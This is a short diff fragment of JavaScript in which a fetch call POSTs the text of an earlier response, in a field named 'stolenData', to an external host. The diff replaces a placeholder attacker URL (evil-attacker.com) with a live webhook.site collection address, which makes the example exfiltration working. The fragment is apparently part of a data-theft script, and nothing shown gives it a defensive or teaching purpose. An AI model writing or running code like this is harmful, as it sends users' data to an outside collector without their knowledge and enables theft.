@@ -15,7 +15,7 @@
     })
     .then(response => response.text())
     .then(data => {
-      fetch("https://evil-attacker.com/log", {
+      fetch("https://webhook.site/133897bf-8640-4cd7-80dd-5561335f708e", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ stolenData: data })
